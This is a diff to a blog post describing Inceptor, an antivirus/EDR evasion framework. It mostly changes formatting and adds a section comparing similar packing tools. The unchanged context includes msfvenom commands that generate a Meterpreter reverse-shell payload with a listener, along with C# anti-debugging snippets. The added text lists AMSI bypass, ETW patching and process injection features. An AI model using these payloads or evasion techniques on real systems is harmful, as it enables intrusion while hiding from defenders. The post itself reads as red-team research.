@@ -193,7 +193,7 @@ life a bit harder. For this reason, I implemented a few simple tricks to check t
 taken as-is or adapted from [Mecanik](https://github.com/Mecanik/Anti-DebugNET):
 
 ```csharp
-# Stupidly simple
+// Stupidly simple
 private static int CheckDebuggerPresent()
 {
     if (System.Diagnostics.Debugger.IsAttached)
@@ -202,7 +202,8 @@ private static int CheckDebuggerPresent()
     }
 return 0;
 }
-# Still simple but less stupid
+
+//Still simple but less stupid
 private static int CheckDebugPort()
 {
     NtStatus status;
@@ -294,7 +295,7 @@ repository. Frida will install a hook on `NtCreateThreadEx`, and Inceptor will t
 
 ### Demo 2.1: we get caught!
 
-```
+```sh-session
 # Console 1: Start Metasploit
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f raw -o msf.raw
 handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
@@ -318,7 +319,7 @@ NtCreateThreadEx performed by the loader:
 
 ### Demo 2.2: Ok, now with manual mapping!
 
-```
+```sh-session
 # Console 1: Start Metasploit
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f raw -o msf.raw
 handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
@@ -359,6 +360,28 @@ As easily observable, I've only talked about the .NET component of Inceptor. The
 be intrinsically more difficult to obfuscate and run than native code. The clear advantage of .NET binaries is that
 they can be loaded reflectively (i.e. within a C2). However, as C# code is easily reversible to IL code, these binaries 
 are easier to analyse and ultimately, it's easier to create signature for them.
+
+## Similar work on the topic
+
+Before the end of the post, I would like to introduce similar tools around the same topics of AV/EDR Evasion and PE 
+packing. Before working on Inceptor, I didn't have much knowledge about other similar open-source solutions. 
+However, while I was doing my research about it, I've come across two of them, and I couldn't possibly miss referencing 
+such amazing tools.
+
+* [PEzor](https://github.com/phra/PEzor): PEzor is an open-source PE packer designed to work on Kali Linux by Francesco 
+  Soncina ([@phraaaaaaa](https://twitter.com/phraaaaaaa)).
+* [Artifacts-Kit](https://github.com/forrest-orr/artifacts-kit): Artifatcts-Kit is a Malicious Memory Artifact Generator 
+  by Forrest Orr ([@_ForrestOrr](https://twitter.com/_ForrestOrr)).
+
+PEzor, in particular, offers a set of features which overlaps with Inceptor, making them respectively the Linux and Windows 
+solution to "evasive" PE packing. They key differences between PEzor and Inceptor are:
+
+* Inceptor is template-driven, meaning it's being designed to let the user write his own templates easily
+* Built-In AMSI, WLDP, and ETW in-memory patching, which can be used as a boilerplate for further development
+* Slightly broader set of features: .NET obfuscation, .NET anti-debug, loader signing.. etc
+* Full support for D/Invoke and Syswhisper (1-2)
+* Support for PowerShell artifacts (with built-in AMSI bypass and code obfuscation)
+* Support for process injection
 
 ## Timeline
 
